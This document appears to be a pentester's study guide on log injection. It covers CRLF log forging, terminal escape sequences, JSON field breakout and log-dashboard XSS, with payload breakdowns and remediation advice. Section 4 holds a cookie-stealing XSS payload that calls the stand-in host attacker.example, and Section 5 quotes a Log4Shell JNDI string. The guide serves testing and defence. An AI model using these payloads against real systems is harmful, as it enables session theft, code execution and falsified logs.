# Log Injection Techniques

## 0. Scope of This File

This file covers attacks against the **integrity and reliability of logs that already exist** — not the absence of logging (that's file 01's "Insufficient Logging" half of A09, and file 03's identification methodology). Log injection is technically CWE-117 (Improper Output Neutralization for Logs), and it sits *inside* A09 because corrupted, spoofed, or weaponized logs are just as much a monitoring failure as no logs at all — a SOC reading falsified entries is arguably worse off than a SOC reading nothing.

The common thread across every technique below: **any value that a user controls and that ends up written into a log file, without being sanitized first, is an injection point.** Usernames, search queries, User-Agent headers, Referer headers, custom headers, form fields — anything reflected into a log line is a candidate.

---

## 1. CRLF Injection / Log Forging

### 1.1 The Concept

Most text-based log formats are line-delimited: one log entry per line, lines separated by a newline (`\n`) or carriage-return-plus-newline (`\r\n`, CRLF). If an application takes user input and writes it into a log line **without stripping or encoding CR/LF characters**, an attacker can inject their own newline characters into the input. This lets them terminate the legitimate log line early and start writing **fabricated lines** that appear, to anyone reading the log, as if the application itself generated them.

### 1.2 Example Payload

Assume an application logs failed login attempts in this format:

```
[INFO] Login attempt for user: <username>
```

Attacker submits this as the username field:

```
admin%0d%0a[INFO] Login attempt for user: admin - SUCCESS
```

### 1.3 Piece-by-Piece Breakdown

| Piece | What it is | Why it's there |
|---|---|---|
| `admin` | The literal start of the injected value | This is what actually gets logged as part of the *real* log line first — keeps the forged entry looking contextually plausible. |
| `%0d` | URL-encoded carriage return (`\r`, hex `0D`) | URL-encoded because this is being submitted through an HTTP parameter; the server will decode it back to a raw `\r` before it's written to the log file. This is the first half of the CRLF pair. |
| `%0a` | URL-encoded line feed (`\n`, hex `0A`) | Completes the CRLF sequence. Once decoded, this terminates the *current* log line in the log file, exactly the way a real newline would. |
| `[INFO] Login attempt for user: admin - SUCCESS` | A second, fully fabricated log line | Because the CRLF before it already closed off the original line, the log file now contains this text as if it were its own independent, application-generated entry — even though it came entirely from attacker input. |

### 1.4 Why This Matters

If a SOC analyst or an automated log-parsing rule is grep-ing for `SUCCESS` after a string of failed logins to flag a possible brute-force success, this injected line can produce a **false positive** (wasting analyst time) or, more dangerously, can be crafted to make a real successful breach **blend into noise**, or to fabricate a benign-looking explanation for suspicious activity that did occur. It can also be used to frame an innocent value (like another username) as the source of malicious activity, polluting forensic timelines during incident response.

### 1.5 Variants to Test

- Raw `\n` / `\r\n` without URL encoding, if the input isn't being parsed through a URL decoder at all (e.g. a header value passed straight through).
- Double-encoding (`%250d%250a`) in case of double-decoding application logic.
- Unicode line separator equivalents (`%E2%80%A8` — U+2028 LINE SEPARATOR, `%E2%80%A9` — U+2029 PARAGRAPH SEPARATOR) against logging pipelines that normalize Unicode before writing but don't filter on raw `\n`/`\r`.

---

## 2. Terminal Escape Sequence Injection

### 2.1 The Concept

Many security teams and sysadmins read raw logs directly in a terminal (via `tail -f`, `cat`, `less`, `grep`, SSH sessions into log servers) rather than exclusively through a parsed dashboard. Terminal emulators interpret **ANSI/VT100 escape sequences** to control color, cursor position, and in some terminals, even window title or clipboard content. If user-controlled input containing raw escape sequences gets written unsanitized into a log file, anyone who later views that log in a vulnerable terminal can be affected.

### 2.2 Example Payload

```
\x1b[31mFAKE ALERT: System Compromised\x1b[0m\x1b]0;pwned\x07
```

### 2.3 Piece-by-Piece Breakdown

| Piece | What it is | Why it's there |
|---|---|---|
| `\x1b` | The ESC character (hex `1B`), which begins almost every ANSI escape sequence | Signals to the terminal "what follows is a control sequence, not literal text to print." |
| `[31m` | An ANSI SGR (Select Graphic Rendition) code for red foreground text | Causes the following text to render in red — used here for visual social-engineering effect (mimicking a real "ALERT" banner) to make the analyst trust or react to a fabricated message. |
| `FAKE ALERT: System Compromised` | Plain attacker-controlled text | The actual social-engineering payload — designed to either distract the analyst from the real attack happening at the same time, or to bait a panicked, ill-considered incident response action. |
| `\x1b[0m` | ANSI reset code | Returns text rendering to default so the rest of the terminal output doesn't stay corrupted/colored, keeping the deception subtle. |
| `\x1b]0;pwned\x07` | An OSC (Operating System Command) escape sequence (`\x1b]0;...\x07`) that sets the terminal window title | Some older or misconfigured terminal emulators have had vulnerabilities where OSC sequences could be abused for more than title-setting (history includes terminal emulator CVEs for buffer issues and even, in poorly sandboxed cases, command injection via certain OSC extensions). Even without an underlying terminal bug, this alone can be used for confusion/persistence (a window permanently retitled "pwned" during a live incident response session). |

### 2.4 Why This Matters

This is a lower-frequency but real finding, especially relevant for clients who have junior SOC analysts or sysadmins regularly tailing raw logs over SSH without piping through a sanitizing viewer. It is also a useful talking point in reports for *why* structured logging (JSON, not raw text) and centralized log viewers (rather than raw terminal access) are the industry-recommended pattern — they remove this entire class of risk by design.

---

## 3. Structured Log (JSON) Injection / Field Breakout

### 3.1 The Concept

Many modern logging pipelines (especially those feeding an ELK/Elastic stack or similar) log in structured JSON rather than plain text, specifically *because* plain-text logs are vulnerable to the CRLF problem above. But structured logging only protects you if the **values are properly JSON-encoded** when inserted. If an application builds its JSON log line via naive string concatenation instead of a proper JSON serializer, an attacker can break out of their intended field and inject **entirely new JSON keys**.

### 3.2 Example Payload

Assume the application builds a log line like this in code (vulnerable pattern):

```
log_line = '{"event":"login_attempt","username":"' + user_input + '","status":"failed"}'
```

Attacker submits this as `user_input`:

```
bob","status":"success","admin":true
```

### 3.3 Resulting (Corrupted) Log Line

```json
{"event":"login_attempt","username":"bob","status":"success","admin":true","status":"failed"}
```

### 3.4 Piece-by-Piece Breakdown

| Piece | What it is | Why it's there |
|---|---|---|
| `bob` | A plausible-looking username | Keeps the early part of the line looking legitimate to a casual reader. |
| `"` | A raw double-quote character | This closes the `username` field's string value *early*, from the parser's perspective — exactly the same logic as the CRLF attack, but targeting JSON syntax instead of line breaks. |
| `,"status":"success"` | A complete, new, well-formed JSON key-value pair | Because the previous field was just closed, the JSON parser now reads this as a *second, legitimate-looking* `status` field. Many JSON parsers (and most SIEM ingestion rules) will take the **last** occurrence of a duplicate key when the object is parsed into a dictionary — meaning this injected `"status":"success"` can silently override the real `"status":"failed"` that appears later in the line. |
| `,"admin":true` | An entirely fabricated boolean field | Demonstrates that the attacker isn't limited to overwriting existing fields — they can inject *new* fields outright, which is especially dangerous if downstream alerting or dashboards key off field presence (e.g. "alert if `admin:true` appears in any login log" could be turned into a denial-of-service against the alerting pipeline through volume, or used to plant misleading forensic artifacts). |
| (trailing) `","status":"failed"}` | The remainder of the original, legitimate template | This is what's left over from the original code template after the attacker's injected content — it now sits as orphaned, malformed trailing content, which is exactly why this technique often **breaks JSON parsing entirely** for the line in a stricter ingestion pipeline (denial of that specific log entry to the SIEM) unless the duplicate-key behavior described above silently "absorbs" it first. |

### 3.5 Why This Matters

This is one of the more dangerous A09-adjacent findings because it directly undermines a control (structured logging) that the client may believe protects them from log injection entirely. The fix isn't "don't use JSON" — it's "use a real JSON serialization library (e.g. `json.dumps()` in Python, `JSON.stringify()` in JS, `Jackson`/`Gson` in Java) instead of manual string concatenation," and this distinction is worth spelling out explicitly in your report's remediation guidance.

---

## 4. Log-Viewer XSS (Stored XSS via Log Display)

### 4.1 The Concept

If an organization has a web-based internal dashboard for viewing logs (a custom admin panel, or even a misconfigured Kibana/Grafana view that renders raw field values as HTML instead of escaping them), and an attacker can get arbitrary text into a log field that's later rendered in that dashboard, this becomes a **stored XSS attack against the SOC team itself** — arguably one of the highest-value XSS targets in an entire environment, since it directly compromises the people responsible for detecting attacks.

### 4.2 Example Payload

Submitted as a User-Agent header on a request to any logged endpoint:

```
<img src=x onerror="fetch('https://attacker.example/c?cookie='+document.cookie)">
```

### 4.3 Piece-by-Piece Breakdown

| Piece | What it is | Why it's there |
|---|---|---|
| `<img src=x` | An `<img>` tag with a deliberately invalid `src` value | The invalid `src` (`x` is not a real image path) guarantees the browser will fail to load it, which is required to trigger the next piece. |
| `onerror="..."` | The `onerror` event handler | Fires automatically the moment the broken image fails to load — no user click or interaction needed, which matters because the "user" here is a SOC analyst who is just passively viewing a log dashboard, not interacting with attacker-controlled content on purpose. |
| `fetch('https://attacker.example/c?cookie='+document.cookie)` | A JavaScript fetch call exfiltrating the viewing analyst's cookies | If the log dashboard is a session-authenticated internal tool, stealing the analyst's (or worse, an admin's) session cookie here can directly lead to a takeover of the **security monitoring tool itself** — a severe escalation. |

### 4.4 Why This Matters

Frame this clearly in any report: this isn't "XSS in the application," it's "XSS in the application's User-Agent header that becomes stored XSS against the internal logging/SOC dashboard." That distinction usually bumps severity, because the blast radius is the security team's own tooling and credentials, not just an end user's session.

### 4.5 Variants

- Any other reflected/logged header (`Referer`, `X-Forwarded-For`, custom headers) or form field is worth testing the same way if you have visibility into how/where the client's log viewer renders data.
- Test both the raw HTTP request value and any value that round-trips through a redirect or error page first — sometimes the log-write happens at a different layer than the one you initially probed.

---

## 5. A Brief, Correctly-Scoped Note on Log4Shell

As flagged in file 01, **Log4Shell (CVE-2021-44228)** is frequently mentioned in A09 discussions, but precision matters here. The underlying flaw was in Log4j's **message lookup substitution feature**, where an attacker-controlled string like:

```
${jndi:ldap://attacker.example/a}
```

passed into a vulnerable Log4j `log.error()`/`log.info()` call would be parsed for `${...}` lookup syntax and trigger a JNDI lookup to an attacker-controlled server, ultimately leading to remote class loading and code execution.

This is best classified under **A06:2021 — Vulnerable and Outdated Components**, since the root cause is a specific vulnerable library version, not a generic "insufficient logging" problem. It's worth knowing and citing correctly, but don't label a Log4Shell finding as A09 in a report — that's a classification an experienced reviewer (or client security team) will likely flag as imprecise.

---

## 6. What Comes Next

File 03 covers how to translate "did logging happen at all" into a defensible report finding — including the honest note on PortSwigger Academy lab coverage for this category, and a step-by-step engagement checklist.
